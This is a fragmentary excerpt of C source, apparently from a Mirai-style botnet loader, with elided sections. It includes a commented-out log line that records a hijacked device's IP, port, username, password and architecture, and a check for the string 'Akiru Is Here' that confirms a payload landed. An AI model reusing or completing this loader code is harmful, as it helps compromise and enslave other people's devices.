...
void connection_close(struct connection *conn)
{
    ...
    if(conn->open)
    {
        ...
        if(conn->success)
        {
            ...
            /*fprintf(stderr, "\x1B[37m[\x1B[31m+\x1B[37m]\x1B[32mSuh dude \x1B[31m---\x1B[33m>\x1B[0m\x1B[33m%d.%d.%d.%d:\x1B[31m%d \x1B[34m%s:\x1B[36m%s %s %d\x1B[0m\n",
                conn->info.addr & 0xff, (conn->info.addr >> 8) & 0xff, (conn->info.addr >> 16) & 0xff, (conn->info.addr >> 24) & 0xff,
                ntohs(conn->info.port),
                conn->info.user, conn->info.pass, conn->info.arch, conn->info.upload_method);*/
        }
    }
...
int connection_verify_payload(struct connection *conn)
{
    ...
    if(util_memsearch(conn->rdbuf, offset, "Akiru Is Here", 13) == -1)
        return offset;
    else
        return 255 + offset;
}
